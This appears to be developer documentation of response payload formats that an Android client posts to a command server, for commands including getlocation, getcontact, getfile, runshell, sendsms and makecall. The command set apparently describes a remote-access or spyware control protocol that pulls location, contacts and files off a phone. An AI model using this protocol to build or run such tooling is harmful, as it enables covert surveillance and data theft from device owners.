# Android Client Response Payload Templates

Post these to `POST /command/complete` as the `response` field value (escaped as a JSON string).

## getlocation
```json
{
  "location": {
    "lat": 37.7749,
    "lng": -122.4194,
    "accuracy": 10.0,
    "altitude": 0.0,
    "provider": "gps"
  }
}
```

## getcontact (list format - preferred)
```json
{
  "contact": [
    {"name": "Alice", "number": "+1234567890", "email": "alice@example.com"},
    {"name": "Bob", "number": "+1987654321", "email": ""}
  ]
}
```

## getcontact (dict format - alternative)
```json
{
  "contact": {
    "Alice": {"name": "Alice", "number": "+1234567890"},
    "Bob": {"name": "Bob", "number": "+1987654321"}
  }
}
```

## getapps
```json
{
  "installed_apps": [
    {"app_name": "WhatsApp", "package_name": "com.whatsapp", "version": "2.24.1"},
    {"app_name": "Telegram", "package_name": "org.telegram.messenger", "version": "10.0"}
  ]
}
```

## listfile
```json
{
  "files": [
    {"name": "document.pdf", "path": "/storage/emulated/0/Documents/document.pdf", "size": 102400, "is_dir": false, "modified": "2026-06-19"},
    {"name": "Photos", "path": "/storage/emulated/0/DCIM", "size": 0, "is_dir": true, "modified": ""}
  ]
}
```

## getfile
```json
{
  "filename": "/storage/emulated/0/Download/report.pdf",
  "content": "<base64-encoded-content-or-file-path>"
}
```

## getservices
```json
{
  "services": [
    {"name": "Phone", "package": "com.android.phone", "state": "running"},
    {"name": "WhatsApp", "package": "com.whatsapp", "state": "background"}
  ]
}
```

## runshell, sendsms, makecall, changewallpaper
```
Plain text response, one line per result.
```

---

### Legacy Python-format (also accepted via sanitizer)
```python
{'location': {'lat': 37.77, 'lng': -122.42, 'accuracy': 10.0}}
{'contact': [{'name': 'Alice', 'number': '+111'}]}
{'installed_apps': ['com.whatsapp', 'com.instagram']}
{'files': ['file1.txt', 'file2.txt', 'folder/']}
```
